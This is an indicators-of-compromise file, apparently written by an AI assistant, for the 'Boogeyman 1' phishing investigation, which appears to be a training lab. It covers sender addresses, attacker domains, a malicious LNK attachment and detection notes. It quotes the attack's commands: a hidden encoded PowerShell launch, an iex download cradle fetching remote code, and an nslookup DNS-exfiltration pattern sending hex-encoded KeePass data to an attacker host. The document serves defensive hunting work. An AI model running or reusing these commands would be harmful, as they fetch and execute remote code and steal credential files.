# Boogeyman 1 — IOCs

This file lists observed indicators of compromise (IOCs) extracted from the investigation notes and evidence. Use these for detection, hunting, and blocking; verify and enrich as more evidence becomes available.

## Email Addresses

- `agriffin@bpakcaging.xyz` — Sender address observed in multiple headers.

## Domains

- `bpakcaging.xyz`
- `files.bpakcaging.xyz` — Host serving the remote payload (`/update`).
- `cdn.bpakcaging.xyz` — Additional attacker hosting domain observed in PowerShell logs.
- `elasticemail.com` — DKIM signing domain observed in headers (mail relay/service).
- `bounces.elasticemail.net` — List-Unsubscribe / bounce host observed.

## URLs

- `http://files.bpakcaging.xyz/update` — Download cradle referenced by decoded PowerShell payload.
- `http://files.bpakcaging.xyz/sq3.exe` — Utility downloaded during endpoint activity.

## Filenames / Artifacts

- `Invoice.zip` — Password-protected archive attached to email.
- `payload.txt` — reconstructed Base64 body used to rebuild `Invoice.zip`.
- `Invoice_20230103.lnk` — Extracted shortcut file that launches PowerShell.
- `excel.ico` (referenced path: `C:\Users\Administrator\Desktop\excel.ico`) — icon used to disguise the LNK.
- `sq3.exe` — Downloaded SQLite utility used to query Sticky Notes data.
- `plum.sqlite` — Microsoft Sticky Notes database accessed by attacker.
- `protected_data.kdbx` — KeePass database targeted for exfiltration.

## Passwords / Secrets Found

- `Invoice2023!` — ZIP archive password included in email body.

## Commands / Execution Strings

- LNK command arguments (observed):
  - `-nop -windowstyle hidden -enc <Base64 payload>`
- Decoded payload:
  - `iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')`
- Seatbelt execution:
  - `Seatbelt.exe -group=user`
- Exfiltration prep:
  - `[System.IO.File]::ReadAllBytes($file)`
- DNS exfiltration:
  - `nslookup`

## Task 3: Encoding and Exfiltration Examples

- Hex conversion example (observed in PowerShell logs):
  - `[System.BitConverter]::ToString($bytes) -replace '-', ''`
- DNS exfiltration command pattern (replace `<hex_chunk>` with observed fragment):
  - `nslookup -type=txt <hex_chunk>.bpakcaging.xyz 167.71.211.113`

## Potential Detection Rules / Hunting Notes

- Alert on processes launching `powershell.exe` with `-enc` and `-windowstyle hidden`.
- Network detection for HTTP requests to `files.bpakcaging.xyz` (or any unusual `.xyz` hosting domains).
- Detection for inbound emails with attachments named `Invoice.zip` and password strings embedded in the message body.

## Evidence Files

- `dump.eml` — original email file
- `Invoice.zip` — reconstructed archive
- `Invoice_20230103.lnk` — extracted LNK
- `lnkparse` output — LNK analysis
- `powershell.json` — endpoint PowerShell log source

## Confidence

- Email address / domains / filenames: high (observed directly in headers and artifacts).
- Download URL and decoded command: high (decoded from LNK arguments).

## Task 3 Additions

- `QL-WKSTN-5693` — Compromised workstation observed in PowerShell logs.
- `j.westcott` — User account associated with the endpoint paths in logs.
- `nslookup` — DNS-based exfiltration mechanism used during the endpoint phase.

---

If you want, I can:

- generate Snort/Suricata or Sigma rules from these IOCs, or
- look up WHOIS / passive DNS for `bpakcaging.xyz` and `files.bpakcaging.xyz` to enrich IOCs.
# Indicators of Compromise

| Type | Indicator | Description | Source |
|---|---|---|---|
| Domain | `cdn.bpakcaging.xyz` | Additional attacker hosting domain observed in PowerShell logs | `powershell.json` |
| Domain | `files.bpakcaging.xyz` | File hosting / download cradle referenced by decoded LNK and PowerShell | decoded LNK, `powershell.json` |
| IP | `167.71.211.113` | Destination used in DNS exfiltration (`nslookup`) | `powershell.json`, network logs |
| File | `protected_data.kdbx` | KeePass database targeted for exfiltration | `powershell.json` |
| File | `plum.sqlite` | Microsoft Sticky Notes database accessed by attacker | `powershell.json` |
| Binary | `sq3.exe` | Downloaded SQLite utility used to query `plum.sqlite` | `powershell.json` |
| Tool | `Seatbelt` / `Invoke-Seatbelt.ps1` | Enumeration tool used for host discovery (`-group user`) | `powershell.json` |